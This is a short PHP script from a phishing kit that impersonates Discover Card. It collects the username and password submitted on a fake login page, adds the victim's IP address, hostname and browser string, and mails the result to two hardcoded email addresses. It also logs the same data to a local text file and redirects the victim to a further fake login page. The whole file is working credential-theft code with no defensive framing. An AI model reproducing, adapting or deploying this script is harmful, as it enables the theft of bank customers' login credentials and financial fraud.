<?php
session_start();



// Put Your Email Here
$userinfo= "mooreben81@gmail.com, aroyapa@yahoo.com";

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];

$message  = "\n";

$message .= "".$_POST['']."\n";
$message .= "<^>Login<^>".$_POST['']."\n";
$message .= "Username1 : ".$_POST['usern']."\n";
$message .= "Password1 : ".$_POST['passwrd']."\n";

$message .= "".$_POST['']."\n";
$message .= "".$_POST['']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "-----------------------SEEDORF-----------------------\n";
$subject="Discover Card | $ip";
$headers = "From: Dsicover<info@server.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($userinfo,$subject,$message,$headers);

$encrypt=  base64_encode($message);
$fp = fopen("paru.txt","a");
fputs($fp,$message);
fclose($fp); 
header("Location: Login_2.html");

?>